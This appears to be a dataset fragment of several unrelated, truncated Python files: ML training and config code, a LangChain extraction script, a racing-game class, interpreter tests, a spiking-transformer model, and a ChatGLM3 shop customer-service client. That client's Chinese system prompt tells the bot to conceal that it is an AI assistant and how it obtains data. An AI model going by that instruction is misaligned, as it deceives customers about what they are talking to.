##\n\nmlflow.set_tracking_uri('http://localhost:5050')\n\ndef train_model(X_train, y_train, plot_name, n_estimators, max_depth, class_weight=None):\n\n    mlflow.set_experiment('churn-detection-db')\n    with mlflow.start_run() as run:\n        mlflow.set_tracking_uri('http://localhost:5050')\n        mlflow.set_tag('clf', 'forest')\n\n        # Try random forest\n        clf = RandomForestClassifier(n_estimators=n_estimators, max_depth=max_depth, \n                                     random_state=45, class_weight=class_weight)\n        clf.fit(X_train, y_train)\n        y_pred_test = clf.predict(X_test_final)\n        \n        ## metrics\n        f1_test = f1_score(y_test, y_pred_test)\n        acc_test = accuracy_score(y_test, y_pred_test)\n\n        # Log params, metrics, and model \n        mlflow.log_params({'n_estimators': n_estimators, 'max_depth': max_depth})\n        mlflow.log_metrics({'accuracy': acc_test, 'f1-score': f1_test})\n        mlflow.sklearn.log_model(clf, f'{clf.__class__.__name__}/{plot_name}')\n\n        ## Plot the confusion matrix and save it to mlflow\n        plt.figure(figsize=(10, 6))\n        sns.heatmap(confusion_matrix(y_test, y_pred_test), annot=True, cbar=False, fmt='.2f', cmap='Blues')\n        plt.title(f'{plot_name}')\n        plt.xticks(ticks=np.arange(2) + 0.5, labels=[False, True])\n        plt.yticks(ticks=np.arange(2) + 0.5, labels=[False, True])\n\n\n        # Save the plot to MLflow\n        conf_matrix_fig = plt.gcf()\n        mlflow.log_figure(figure=conf_matrix_fig, artifact_file=f'{plot_nam",
    "# --------------------------------\n# Testing\n# --------------------------------\n# is it a test run?\n# test runs reduce the dataset to 100 instances only\nfrom enum import IntEnum\n\nTEST = True\n\n# --------------------------------\n# FileTypes\n# --------------------------------\n# Do we only look at production or test files or both?\n# 0 = only_production, 1 = only_test, 2 = production_and_test\nFILE_TYPE = 2\n\n# --------------------------------\n# Database related\n# --------------------------------\n# do we use the cached results? True=yes, False=no, go always to the db\nUSE_CACHE = True\n\n# is the db available? sometimes it's not, but you have all the cache\nDB_AVAILABLE = True\n\n# --------------------------------\n# Dataset balancing\n# --------------------------------\nBALANCE_DATASET = True\n\n# how to balance the dataset\n# options = [random, cluster_centroids, nearmiss]\nBALANCE_DATASET_STRATEGY = \"random\"\n\n# --------------------------------\n# Dataset scaling\n# --------------------------------\n\n# scale using MinMaxScaler?\nSCALE_DATASET = True\n\n# --------------------------------\n# Feature reduction\n# --------------------------------\n#Remove all instances where one of process and authorship metrics is -1 (faulty).\nDROP_FAULTY_PROCESS_AND_AUTHORSHIP_METRICS = True\n# Use (or drop) process and authorship metrics, this cancels DROP_FAULTY_PROCESS_AND_AUTHORSHIP_METRICS.\nDROP_PROCESS_AND_AUTHORSHIP_METRICS = False\n#a list of all process and authorship metrics\nPROCESS_AND_AUTHORSHIP_METRICS = [\"authorOwnership\", \"bugFixCount\", \"qtyMajorAuthors\", \"qtyMinorAuthors\", \"qtyOfAuthors\", \"qtyOfCommits\", \"refactoringsInvolved\"]\n\n# Drop these metrics as well\n# TODO: validate this\n#   number of default fields and methods is always 0. Thus, remove them from the data.\nDROP_METRICS = [\"classNumberOfDefaultFields\", \"classNumberOfDefaultMethods\"]\n\n# perform feature reduction?\nFEATURE_REDUCTION = True\n\n# number of folds for feature reduction\nN_CV_FEATURE_REDUCTION = 5\n\n# --------------------------------\n# Hyperparameter search\n# --------------------------------\n\n# what type of search for the best hyper params?\n# options = [randomized, grid]\nSEARCH = \"randomized\"\n\n# number of iterations (if Randomized strategy is chosen)\nN_ITER_RANDOM_SEARCH = 100\n\n# number of folds in the search for best parameters\nN_CV_SEARCH = 5\n\n# --------------------------------\n# Evaluation: Cross-validation configuration\n# --------------------------------\n\n# Specify either a train/ test split, e.g. 0.2 -> 80/ 20 split\nTEST_SPLIT_SIZE = -1\n# Or specify test data sets in the database\n# NOTE: set TEST_SPLIT_SIZE value to < 0, in order to indicate to use the given datasets instead of a random train/ test split\nVALIDATION_DATASETS = [\"test set github\", \"validation set github\"]\n\n# number of folds for the final evaluation\nN_CV = 10\n\n# number of folds for the DNN\nN_CV_DNN = 10\n\n# --------------------------------\n# Models and datasets\n# --------------------------------\n\n# models and datasets we have available\nMODELS = ['svm', 'svm-non-linear', 'decision-tree', 'random-forest', 'logistic-regression', 'naive-bayes',\n          'extra-trees']\n\n# Empty dataset means 'all datasets'\nDATASETS = [\"github\"]\n\n\n# --------------------------------\n# Refactorings\n# --------------------------------\n\n# refactoring levels\nclass Level(IntEnum):\n    NONE = 0\n    Class = 1\n    Method = 2\n    Variable = 3\n    Field = 4\n    Other = 5\n\n\n# Refactorings to study\nCLASS_LEVEL_REFACTORINGS = [\"Extract Class\",\n                            \"Extract Interface\",\n                            \"Extract Subclass\",\n                            \"Extract Superclass\",\n                            \"Move And Rename Class\",\n                            \"Move Class\",\n                            \"Rename Class\",\n                            \"Introduce Polymorphism\",\n                            \"Move And Rename Class\",\n                            \"Convert Anonymous Class To Type\"]\n\nMETHOD_LEVEL_REFACTORINGS = [\"Extract And Move Method\",\n                             \"Extract Method\",\n                             \"Inline Method\",\n                             \"Move Method\",\n                             \"Pull Up Method\",\n                             \"Push Down Method\",\n                             \"Rename Method\",\n                             \"Extract And Move Method\",\n                             \"Change Return Type\",\n                             \"Move And Inline Method\",\n                             \"Move And Rename Method\",\n                             \"Change Parameter Type\",\n                             \"Split Parameter\",\n                             \"Merge Parameter\"]\n\nVARIABLE_LEVEL_REFACTORINGS = [\"Extract Variable\",\n                               \"Inline Variable\",\n                               \"Parameterize Variable\",\n                               \"Rename Parameter\",\n                               \"Rename Variable\",\n                               \"Replace Variable With Attribute\",\n                               \"Change Variable",
    "#02_convert_to_list.py\n\n\n\nfrom langchain.output_parsers import CommaSeparatedListOutputParser\nfrom langchain.prompts import PromptTemplate\nfrom langchain_openai import ChatOpenAI\n\noutput_parser = CommaSeparatedListOutputParser()\n\nformat_instructions = output_parser.get_format_instructions()\n\nimport pandas as pd\nimport time\nimport json\nimport re\n\n\nlist_phils_prompt = PromptTemplate(\n    template=\"Identify ALL philosophical traditions or philosophers \" \\\n        \"specifically named or clearly implied in the input text, reporting just the name \" \\\n        \"of the school of thought or the philosopher. \" \\\n        \"If a philosopher or school of thought is clearly being referred to, \" \\\n        \"they may be included in the list.\\n# Input text: {input_text}\\n{format_instructions}\",\n    input_variables=[\"input_text\"],\n    partial_variables={\"format_instructions\": format_instructions},\n)\n\n\n\n\n\nmodel = ChatOpenAI(temperature=0)\n\nchain = list_phils_prompt | model | output_parser\n\n\ncurr_temp = \"1\" #for input\n\ndata_folder =  os.getcwd()\n\nerrs = []\n\nfor promptversion in ['v1','v2_diverse','v3']:\n    print('-----')\n    for whichmodel in [\"claude-3-sonnet\",'gemini-pro','llama2-70b','gpt-3.5-turbo']:\n        filein = data_folder +  whichmodel + \"_temp\" + curr_temp +\"_\" + promptversion+ '.csv'\n        df = pd.read_csv(filein)\n        print(\"len %d\", len(df))\n        texts = df.text\n        print(promptversion, whichmodel)\n        print(texts[1][-100:])\n\n\n        lists = []\n\n        meta_info = []\n\n        i = start\n        for intext in texts[0:100]:\n            print(i)\n            print(intext)\n            i +=1\n            try:\n                res = chain.invoke({\"input_text\": intext})\n                print(res)\n                lists.append(res)\n                meta_info.append([i, intext])\n                time.sleep(1.1)\n            except:\n                print(\"failed\")\n                errs.append(i)\n                time.sleep(3)\n\n        print(errs)\n        df2 = pd.DataFrame(meta_info)\n\n        df2['lists'] = lists\n        df2.columns = ['i', 'text', 'list']\n\n\n        fileout = data_folder + whichmodel + \"_temp\" + str(curr_temp)  + '_' +promptversion +\".csv\"\n        df2.to_csv(fileout, index=False)\n        df2.to_parquet(data_folder + whichmodel + \"_temp\" + str(curr_temp) +'_'+ promptversion +\".parquet\", engine='pyarrow')\n\n\n\n\n\n\n\n",
    "import requests\nfrom tools import tools_mapping\nimport json\nimport requests\nimport json\nfrom tools import tools_mapping\n\n\nclass ChatGLM3:\n    def __init__(self):\n        self.chat_history = []\n        self.prompt = {\n            \"role\": \"system\",\n            \"content\": \"\"\"\n        \u89d2\u8272\u6e05\u6670\uff1a \u4f60\u662f\u58f9\u53f7\u65d7\u8230\u5e97\u7684\u4e00\u4e2a\u7535\u5546\u5ba2\u670d,\u4eca\u5e7420\u5c81,\u56de\u590d\u5185\u5bb9\u8bed\u53e5\u901a\u987a\u3001\u903b\u8f91\u5408\u7406,\u4eb2\u5207\u968f\u548c,\u6bcf\u6b21\u56de\u590d\u5fc5\u987b\u5b8c\u6574\u5e76\u4e14\u7cbe\u51c6\u56de\u7b54\u7528\u6237\u95ee\u9898, \u5982\u9047\u5230api\u8fd4\u56de\u7ed3\u679c\u65f6\u5b8c\u5168\u6309\u7167\u4e0b\u9762\u5b9a\u4e49\u597d\u7684\u683c\u5f0f\u8fd4\u56de\u3002\n        \u7ed3\u6784\u5316\u4ea4\u4e92\uff1a \u5f53\u7528\u6237\u89e6\u53d1\u67d0\u4e2a\u51fd\u6570\u65f6\uff0c\u4f60\u9700\u8981\u6355\u83b7\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u54cd\u5e94\uff0c\u5e76\u6309\u7167\u6307\u5b9a\u683c\u5f0f\u8fdb\u884c\u8f93\u51fa\u3002\n        \u660e\u786e\u6307\u5bfc\uff1a \u8bf7\u786e\u4fdd\u5728\u89e6\u53d1\u51fd\u6570\u540e\uff0c\u6b63\u786e\u6355\u83b7\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u54cd\u5e94\uff0c\u5e76\u6309\u7167\u6307\u5b9a\u683c\u5f0f\u8fdb\u884c\u8f93\u51fa\u3002\n        \u524d\u63d0\u6761\u4ef6\uff1a\n        \u8ba2\u5355\u72b6\u6001\u679a\u4e3e\u503c\u8bbe\u5b9a\u4e3a\uff1a1\u4e3a\u5df2\u4e0b\u5355\uff0c2\u4e3a\u5df2\u53d1\u8d27\uff0c3\u4e3a\u5df2\u53d6\u6d88\uff0c4\u4e3a\u5df2\u5b8c\u6210\u3002\n        \u5904\u7406\u65b9\u5f0f\uff1a\n        \u9047\u5230\u8ba2\u5355\u72b6\u6001\u65f6\uff0c\u8fdb\u884c\u679a\u4e3e\u8f6c\u6362\u3002\n        \u91cd\u8981\uff01\uff01\uff01api\u8c03\u7528\u7ed3\u679c\u540e\u7684\u56de\u590d\u4e00\u5b9a\u8981\u6309\u56fa\u5b9a\u8fd4\u56de\u683c\u5f0f\n        \u8bf7\u4e0d\u8981\u900f\u9732\u4f60\u7528\u4ec0\u4e48\u65b9\u5f0f\u83b7\u53d6\u7684\u6570\u636e\uff0c \u4e0d\u8981\u63d0\u53ca\u6839\u636eAPI\u8fd4\u56de\u7684\u7ed3\u679c, \u4e0d\u8981\u63d0\u53ca\u7ecf\u8fc7\u641c\u7d22\u5546\u54c1API, \u4e0d\u8981\u63d0\u53ca\u4f60\u662f\u4eba\u5de5\u667a\u80fd\u52a9\u7406/\u52a9\u624b\u3002\n        \u9047\u5230\u65f6\u95f4\u65f6\uff0c\u683c\u5f0f\u5316\u4e3a\u5e74-\u6708-\u65e5\u3002\n        \u4eca\u5929\u65e5\u671f\u662f{date}\n        \u5982\u679c\u9047\u5230\u56fe\u7247\u7528html\u683c\u5f0f image\u6807\u7b7e\u5c06\u5176\u5305\u88c5\u8fd4\u56de\n        \u91cd\u8981\uff01\uff01\uff01\u56de\u590d\u5982\u9047\u5230api\u8fd4\u56de\u7ed3\u679c\u65f6\u5b8c\u5168\u6309\u7167\u4e0b\u9762\u90e8\u5206\u5b9a\u4e49\u597d\u7684\u683c\u5f0f\u8fd4\u56de\u3002\n        \u5728\u6536\u5230api\u8fd4\u56de\u8ba2\u5355\u4fe1\u606f\u5217\u8868\u65f6\u5019\u8fd4\u56de\u7ed3\u679c\u53ea\u9009\u53d6\u4e00\u6761\u6700\u5339\u914d\u7528\u6237\u63cf\u8ff0\u7684\u8ba2\u5355\u3002\n        \u7528\u6237\u610f\u56fe\u54a8\u8be2\u5546\u54c1\u65f6\u5019\uff0c\u5fc5\u987b\u8c03\u7528search_product\uff0c\u4e0d\u53ef\u4e71\u56de\u590d\u5546\u54c1\uff0c\u5e76\u5c06\u8c03\u7528\u7ed3\u679c\u6309\u7167\u4e0b\u9762\u683c\u5f0f\u5316\u8f93\u51fa,\n        \u683c\u5f0f\u5982\u4e0b:\n        \u5546\u54c1\u540d\u79f0\uff1axx \\n\n        \u4ef7\u683c\uff1axx \\n\n        \u5546\u54c1\u4fe1\u606f\uff1axx \\n\n        \u5c3a\u5bf8\uff1axx \\n\n        \u5546\u54c1\u56fe\u7247\uff1a<img width=\"100%\" height=\"200\" src=\"xx\u5730\u5740\"/> \\n\n        [\u8d2d\u4e70\u94fe\u63a5](\u5546\u54c1\u94fe\u63a5)\\n\n        \u6bcf\u4e2a\u5c5e\u6027\u9700\u6dfb\u52a0\u6362\u884c\u7b26\u3002\n        \u91cd\u8981\uff01\uff01\uff01function response \u6240\u6709\u90fd\u9700\u8981\u6309\u5b9a\u4e49\u597d\u7684\u683c\u5f0f\u8f93\u51fa\u5185\u5bb9\n        \u7528\u6237\u610f\u56fe\u54a8\u8be2\u8ba2\u5355\u65f6\u5019\uff0c\u5fc5\u987b\u8c03\u7528pick_order\uff0c\u4e0d\u53ef\u4e71\u56de\u590d\u8ba2\u5355\uff0c\u5e76\u5c06\u8c03\u7528\u7ed3\u679c\u6309\u7167\u4e0b\u9762\u683c\u5f0f\u5316\u8f93\u51fa,\n        \u683c\u5f0f\u5982\u4e0b:\n        \u8ba2\u5355\u5546\u54c1\u4fe1\u606f\uff1axx \\n\n        \u5546\u54c1\u4ef7\u683c\uff1axx \\n\n        \u8fd0\u8d39\u4ef7\u683c\uff1axx \\n\n        \u6536\u8d27\u5730\u5740\u4fe1\u606f\uff1axx \\n\n        \u8ba2\u5355\u72b6\u6001\uff1axx \\n\n        \u4e0b\u5355\u65f6\u95f4\uff1axx \\n\n        \u6bcf\u4e2a\u5c5e\u6027\u9700\u6dfb\u52a0\u6362\u884c\u7b26\u3002\n        \u5728\u6536\u5230search_product \u5373\u67e5\u8be2\u5546\u54c1 api\u8fd4\u56de\u5546\u54c1\u4fe1\u606f\u65f6\u5019\u8fd4\u56de\u7ed3\u679c\uff0c\u6bcf\u4e2a\u5c5e\u6027\u9700\u6dfb\u52a0\u6362\u884c\u7b26 \uff0c\u6309\u4e0b\u9762\u793a\u4f8b\u683c\u5f0f\u5316\u8f93\u51fa\u5c06xx\u66ff\u6362\u4e3a\u8fd4\u56de\u7ed3\u679c\u5bf9\u5e94\u6570\u636e\uff1a\n        \u5546\u54c1\u540d\u79f0\uff1axx \\n\n        \u4ef7\u683c\uff1axx \\n\n        \u5546\u54c1\u4fe1\u606f\uff1axx \\n\n        \u5c3a\u5bf8\uff1axx \\n\n        \u5546\u54c1\u56fe\u7247\uff1a<img width=\"100%\" height=\"200\" src=\"xx\u5730\u5740\"/>\\n\n        [\u8d2d\u4e70\u94fe\u63a5](\u5546\u54c1\u94fe\u63a5)\\n\n        \u5728\u6536\u5230pick_order \u5373\u67e5\u8be2\u8ba2\u5355 api\u8fd4\u56de\u8ba2\u5355\u4fe1\u606f\u65f6\u8fd4\u56de\u7ed3\u679c\uff0c\n        \u6bcf\u4e2a\u5c5e\u6027\u9700\u6dfb\u52a0\u6362\u884c\u7b26 \u6309\u4e0b\u9762\u793a\u4f8b\u683c\u5f0f\u5316\u8f93\u51fa\u5c06xx\u66ff\u6362\u4e3a\u8fd4\u56de\u7ed3\u679c\u5bf9\u5e94\u6570\u636e\uff1a\n        \u8ba2\u5355\u5546\u54c1\u4fe1\u606f\uff1axx \\n\n        \u5546\u54c1\u4ef7\u683c\uff1axx \\n\n        \u8fd0\u8d39\u4ef7\u683c\uff1axx \\n\n        \u6536\u8d27\u5730\u5740\u4fe1\u606f\uff1axx \\n\n        \u8ba2\u5355\u72b6\u6001\uff1axx \\n\n        \u4e0b\u5355\u65f6\u95f4\uff1axx \\n\u3002\n        \"\"\",\n            \"name\": \"string\",\n            \"function_call\": {},\n        }\n        self.functions = [\n            {\n                \"name\": \"search_product\",\n                \"description\": \"\"\"\u5206\u6790\u7528\u6237\u610f\u56fe\u5f53\u60f3\u8981\u8d2d\u4e70\u5546\u54c1\u3001\u4e86\u89e3\u5546\u54c1\u4fe1\u606f\u3001\u63a8\u8350\u5546\u54c1\u65f6\u5019\u89e6\u53d1\uff0c\u4f8b\u5982\uff1a\u8bf7\u4ecb\u7ecd\u4e0b\u5546\u54c1\u540d\u3001 \u60f3\u4e86\u89e3\u4e0b\u5546\u54c1\u540d\u3001\u8bf7\u8bf4\u8bf4\u5546\u54c1\u540d\u3001\u6211\u8981\u4e70\u5546\u54c1\u540d\u3001\u5546\u54c1\u540d\u3001\u63a8\u8350\u4e2a\u5546\u54c1\u540d\"\"\",\n                \"parameters\": {\n                    \"type\": \"object\",\n                    \"properties\": {\n                        \"query\": {\"description\": \"\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\u63d0\u53d6\u51fa\u7684\u5546\u54c1\u540d\u79f0\"},\n                    },\n                    \"required\": [\"query\"],\n                },\n            },\n            {\n                \"name\": \"pick_order\",\n                \"description\": \"\uff01\uff01\uff01\u5206\u6790\u7528\u6237\u610f\u56fe\u5f53\u60f3\u8981\uff08\u67e5\u8be2/\u83b7\u53d6\uff09\u8ba2\u5355\u4fe1\u606f\u65f6\u5019\u89e6\u53d1\uff0c\u4f8b\u5982\uff1a\u8bf7\u5e2e\u6211\u770b\u4e0b\u6628\u5929\u8ba2\u5355 \u60f3\u5e2e\u6211\u67e5\u8be2\u67d0\u67d0\u7684\u8ba2\u5355 \u8bf7\u5e2e\u6211\u770b\u770b\u67d0\u67d0\u8ba2\u5355\u53d1\u8d27\u4e86\u6ca1, \u770b\u770b\u6211xx\u7684\u8ba2\u5355\",\n                \"parameters\": {\n                    \"type\": \"object\",\n                    \"properties\": {\n                        \"query\": {\n                            \"description\": \"\u7528\u6237\u8f93\u5165\u5185\u5bb9\u63d0\u53d6\u51fa\u7684\u8ba2\u5355\u67e5\u8be2\u6761\u4ef6\u4fe1\u606f\"\n                        },\n                    },\n                    \"required\": [\"query\"],\n                },\n            },\n            {\n                \"name\": \"cancel_order\",\n                \"description\": \"\u5206\u6790\u7528\u6237\u610f\u56fe\u5f53\u60f3\u8981\u4e86\u53d6\u6d88\u8ba2\u5355\u65f6\u5019\u89e6\u53d1\uff0c\u4f8b\u5982\u8bf7\u5e2e\u6211\u53d6\u6d88\u8ba2\u5355\u3001\u53d6\u6d88\u8ba2\u5355\u3001cancel\",\n                \"parameters\": {\n                    \"type\": \"object\",\n                    \"properties\": {\n                        \"query\": {\"description\": \"\u63d0\u53d6\u4e0a\u4e0b\u6587\u4e2d\u6700\u8fd1\u4e00\u6761\u5185\u5bb9\u7684\u8ba2\u5355id\"},\n                    },\n                    \"required\": [\"query\"],\n                },\n            },\n        ]\n        self.url = \"http://192.168.31.125:8001/v1/chat/completions\"\n        self.headers = {\n            \"accept\": \"application/json\",\n            \"Content-Type\": \"application/json\",\n        }\n\n    def call_api(self, data):\n        try:\n            response = requests.post(self.url, headers=self.headers, json=data)\n            response.raise_for_status()\n            return response.json()\n        except requests.exceptions.RequestException as e:\n            raise SystemExit(e)\n\n    def chat(self, query):\n        if not isinstance(query, str):\n            raise ValueError(\"query must be a string\")\n        if not query:\n            raise ValueError(\"query must not be empty\")\n\n        messages = [\n            self.prompt,\n            {\n                \"role\": \"user\",\n                \"content\": query,\n                \"name\": \"string\",\n                \"function_call\": {},\n            },\n        ]\n        self.chat_history.append(messages[-1])\n\n        data = {\n            \"model\": \"chatglm3-6b\",\n            \"messages\": messages,\n            \"temperature\": 0.1,\n            \"max_tokens\": 0,\n            \"stream\": False,\n            \"functions\": self.functions,\n            \"repetition_penalty\": 1.1,\n        }\n        json_response = self.call_api(data)\n        response_message = json_response[\"choices\"][0][\"message\"]\n        function_call = response_message[\"function_call\"]\n        if function_call is None:\n            self.chat_history.append(response_message)\n            return response_message[\"content\"]\n\n        function_response = tools_mapping.get(function_call[\"name\"])(\n            json.loads(function_call[\"arguments\"])\n        )\n        self.chat_history.append(response_message)\n        messag",
    "import random\n\nimport config\nfrom graphics import Drawable\n\n\nclass PlayerCar(Drawable):\n    def __init__(self, environment):\n        super().__init__(\n            'player_car',\n            ['car.png', 'car_crashed.png', 'car_right.png', 'car_left.png'],\n            0, [(config.GAME_WIDTH_TILES - 1) / 2.0, -1])\n        self.speed = 0.0\n        self.max_speed = 0.0\n        self.crashed = False\n        self.started = False\n        self.finished = False\n        self.blocked = False\n        self.slipped_frames = 0\n        self.slipped_direction = 0\n        self.env_sync(environment)\n        self.segments = (((25, 0), (84, 0)),\n                         ((25, 108), (84, 108)),\n                         ((25, 0), (25, 108)),\n                         ((84, 0), (84, 108)))\n\n    def move(self, left=False, right=False):\n        if not self.started:\n            return\n        if self.crashed:\n            return\n        if self.finished:\n            return\n        if self.slipped_frames > 0:\n            if self.slipped_direction > 0:\n                self.active_sprite_index = 2\n            else:\n                self.active_sprite_index = 3\n            self.position[0] += self.slipped_direction\n            self.slipped_frames -= 1\n            if self.slipped_frames == 0:\n                self.active_sprite_index = 0\n            return\n        if left:\n            self.position[0] -= config.PLAYER_HORIZ_SPEED\n        if right:\n            self.position[0] += config.PLAYER_HORIZ_SPEED\n\n    def slip(self):\n        if self.slipped_frames > 0:\n            return\n        self.slipped_frames = 35\n        self.slipped_direction = \\\n            random.choice([-1, +1]) * (config.PLAYER_HORIZ_SPEED * 0.85) * (\n                self.speed / config.PLAYER_MAX_SPEED)\n\n    def accelerate_step(self):\n        if not self.started:\n            return\n        if self.blocked:\n            self.speed = max(0.0, self.speed - 2.5 *\n                             config.PLAYER_DECEL_FACTOR)\n            return\n        if self.crashed:\n            return\n        if self.finished:\n            return\n        speed_ratio = self.speed / config.PLAYER_MAX_SPEED\n        accel = config.PLAYER_ACCEL_FACTOR * \\\n            min(1.0, (1.0 + config.PLAYER_ACCEL_EASE - speed_ratio))\n        self.speed = min(config.PLAYER_MAX_SPEED, self.speed + accel)\n\n    def brake_step(self):\n        if not self.started:\n            return\n        if self.crashed:\n            return\n        if self.finished:\n            return\n        self.speed = max(0.0, self.speed - config.PLAYER_BRAKE_FACTOR)\n        if self.blocked:\n            return\n        self.speed = max(self.speed, min(\n            self.max_speed, config.PLAYER_MIN_SPEED))\n\n    def decelerate_step(self):\n        if not self.started:\n            return\n        if self.blocked:\n            self.speed = max(0.0, self.speed - 2.5 *\n                             config.PLAYER_DECEL_FACTOR)\n            return\n        if self.crashed:\n            return\n        if self.finished:\n            return\n        self.speed = max(0.0, self.speed - config.PLAYER_DECEL_FACTOR)\n        self.speed = max(self.speed, min(\n            self.max_speed, config.PLAYER_MIN_SPEED))\n\n    def crash(self):\n        if not self.started:\n            return\n        if self.finished:\n            return\n        self.crashed = True\n        self.active_sprite_index = 1\n        self.speed = 0.0\n\n    def block(self):\n        self.blocked = True\n\n    def env_sync(self, environment):\n        if self.crashed:\n            return\n        self.max_speed = max(self.max_speed, self.speed)\n        if self.finished:\n            self.speed = 0.0\n            self.position[1] -= config.PLAYER_WIN_SPEED\n            return\n        self.position[1] = environment.y_pos + config.GAME_HEIGHT_TILES - \\\n            0.75 - self.speed * config.PLAYER_MOVE_FACTOR\n",
    "from expr import *\nfrom interpreter import Interpreter\nfrom tokens import *\nfrom parser import *\nfrom util import RuntimeException\n\nimport unittest\n\n\ndef eval_as_expression(text):\n    sc = Scanner(text)\n    tokens = sc.scanTokens()\n    ti = TokenIter(tokens)\n    expr = expression(ti)\n    inpr = Interpreter()\n    return expr.visit(inpr)\n\n\nclass TestExpr(unittest.TestCase):\n    def testUnary(self):\n        self.assertEqual(eval_as_expression(\"-2\"), -2)\n        self.assertEqual(eval_as_expression(\"--2\"), 2)\n\n        self.assertEqual(eval_as_expression(\"!true\"), False)\n        self.assertEqual(eval_as_expression(\"!!true\"), True)\n\n    def testBooleanStuff(self):\n        self.assertTrue(eval_as_expression('\"potato\"'))  # strings are truthy\n        self.assertTrue(eval_as_expression(\"!nil\"))  # nil is false, negating it is true\n        self.assertTrue(eval_as_expression(\"!!true\"))  # double negate true\n\n    def testBinary(self):\n        self.assertEqual(eval_as_expression(\"1+1\"), 2)\n        self.assertEqual(eval_as_expression(\"1+1+(2+2)+(3)\"), 9)\n\n        self.assertEqual(eval_as_expression(\"1+2*3\"), 7)\n        self.assertEqual(eval_as_expression(\"1+2*3*4*5\"), 121)\n\n        self.assertEqual(eval_as_expression(\"10 % 3\"), 1)\n        self.assertEqual(eval_as_expression(\"10 % 3 * 2 + 1\"), 3)\n\n        self.assertEqual(eval_as_expression(\"10 / 3\"), (10 / 3))\n        self.assertEqual(eval_as_expression(\"15 / 3 * 8 \"), 40)\n\n        with self.assertRaises(RuntimeException) as err:\n            eval_as_expression('2 * \"potato\" * 2')\n        with self.assertRaises(RuntimeException) as err:\n            eval_as_expression('\"tomato\" > 3')\n        with self.assertRaises(RuntimeException) as err:\n            eval_as_expression(\"4/0\")\n\n        self.assertEqual(eval_as_expression('\"potato \" + \"tomato\"'), \"potato tomato\")\n        self.assertEqual(eval_as_expression('\"potato \" +3'), \"potato 3.0\")\n\n    def testBinaryBool(self):\n        true_strings = [\n            \"15%4==3\",\n            \"10%3!=3\",\n            \"3==3\",\n            '11*3!=\"potato\"',\n            '\"potato\" == \"potato\"',\n            \"11*3!=3\",\n            \"6 > 3\",\n            \"5 >= 3\",\n        ]\n        for s in true_strings:\n            self.assertTrue(eval_as_expression(s))\n\n        false_strings = [\n            \"3!=3\",\n            \"15%4!=3\",\n            \"10%3==3\",\n            \"11*3==3\",\n            \"4/3==3/4\",\n            \"5 < 3\",\n            \"5 <= 3\",\n        ]\n        for s in false_strings:\n            self.assertFalse(eval_as_expression(s))\n\n    def testTernary(self):\n        self.assertEqual(eval_as_expression(\"5 < 3 ? 32 : 10\"), 10)\n        self.assertEqual(eval_as_expression(\"5 > 3 ? 32 : 10\"), 32)\n\n        self.assertEqual(eval_as_expression(\"5 == 3 ? 32 : 10\"), 10)\n        self.assertEqual(eval_as_expression(\"5 != 3 ? 32 : 10\"), 32)\n",
    "import torch\nimport torch.nn as nn\nfrom timm.models.layers import to_2tuple, trunc_normal_, DropPath\nfrom timm.models.registry import register_model\nfrom timm.models.vision_transformer import _cfg\nimport torch.nn.functional as F\nfrom braincog.model_zoo.base_module import BaseModule\nfrom braincog.base.node.node import *\nfrom braincog.base.connection.layer import *\nfrom braincog.base.strategy.surrogate import *\nfrom LIFNode import MyNode  # LIFNode setting for Spiking Tranformers\nfrom functools import partial\n\n__all__ = ['spikformer']\n\n'''The input shape of neuromorphic datasets in Spiking Transformer when using Braincog\nare used to set to 64*64 '''\n\n\n\nclass MLP(BaseModule):\n    #Linear here is subsituted by convs\n    def __init__(self, in_features, step=10, encode_type='direct', hidden_features=None, out_features=None, drop=0.):\n        super().__init__(step=10, encode_type='direct')\n        out_features = out_features or in_features\n        hidden_features = hidden_features or in_features\n        self.fc1_conv = nn.Conv1d(in_features, hidden_features, kernel_size=1, stride=1)\n        self.fc1_bn = nn.BatchNorm1d(hidden_features)\n        self.fc1_lif = MyNode(step=step, tau=2.0)\n\n        self.fc2_conv = nn.Conv1d(hidden_features, out_features, kernel_size=1, stride=1)\n        self.fc2_bn = nn.BatchNorm1d(out_features)\n        self.fc2_lif = MyNode(step=step, tau=2.0)\n\n        self.c_hidden = hidden_features\n        self.c_output = out_features\n\n    def forward(self, x):\n        self.reset()\n\n        T, B, C, N = x.shape\n\n        x = self.fc1_lif(x.flatten(0, 1)).reshape(T, B, C, N).contiguous()\n        x = self.fc1_conv(x.flatten(0, 1)) \n        x = self.fc1_bn(x).reshape(T, B, self.c_hidden, N).contiguous()  # T B C N\n        \n        x = self.fc2_lif(x.flatten(0, 1)).reshape(T, B, self.c_hidden, N).contiguous()\n        x = self.fc2_conv(x.flatten(0, 1))\n        x = self.fc2_bn(x).reshape(T, B, C, N).contiguous()\n        \n        return x\n\nclass SSA(BaseModule):\n    def __init__(self, dim, step=10, encode_type='direct', num_heads=16, qkv_bias=False, qk_scale=None, attn_drop=0.,\n                 proj_drop=0., sr_ratio=1):\n        super().__init__(step=10, encode_type='direct')\n        assert dim % num_heads == 0, f\"dim {dim} should be divided by num_heads {num_heads}.\"\n        self.dim = dim\n\n        # for shortcut\n        self.head_lif = MyNode(step=step, tau=2.0)\n\n        self.num_heads = num_heads\n        # scale\n        self.scale = 0.25\n\n        self.q_conv = nn.Conv1d(dim, dim, kernel_size=1, stride=1, bias=False)\n        self.q_bn = nn.BatchNorm1d(dim)\n        self.q_lif = MyNode(step=step, tau=2.0)\n\n        self.k_conv = nn.Conv1d(dim, dim, kernel_size=1, stride=1, bias=False)\n        self.k_bn = nn.BatchNorm1d(dim)\n        self.k_lif = MyNode(step=step, tau=2.0)\n\n        self.v_conv = nn.Conv1d(dim, dim, kernel_size=1, stride=1, bias=False)\n        self.v_bn = nn.BatchNorm1d(dim)\n        self.v_lif = MyNode(step=step, tau=2.0)\n\n        self.attn_drop = nn.Dropout(0.2)\n        self.res_lif = MyNode(step=step, tau=2.0)\n        self.attn_lif = MyNode(step=step, tau=2.0, v_threshold=0.5, )\n\n        self.proj_conv = nn.Conv1d(dim, dim, kernel_size=1, stride=1, bias=False)\n        self.proj_bn = nn.BatchNorm1d(dim)\n        self.proj_lif = MyNode(step=step, tau=2.0, )\n\n        self.sd_lif = PLIFNode(step=step, threshold=0.5, tau=2)\n\n    def forward(self, x):\n        self.reset()\n\n        T, B, C, N = x.shape\n\n        x_for_qkv = x.flatten(0, 1)  # TB, C N\n\n        x_for_qkv = self.head_lif(x_for_qkv)\n\n        q_conv_out = self.q_conv(x_for_qkv)  # [TB] C N\n        q_conv_out = 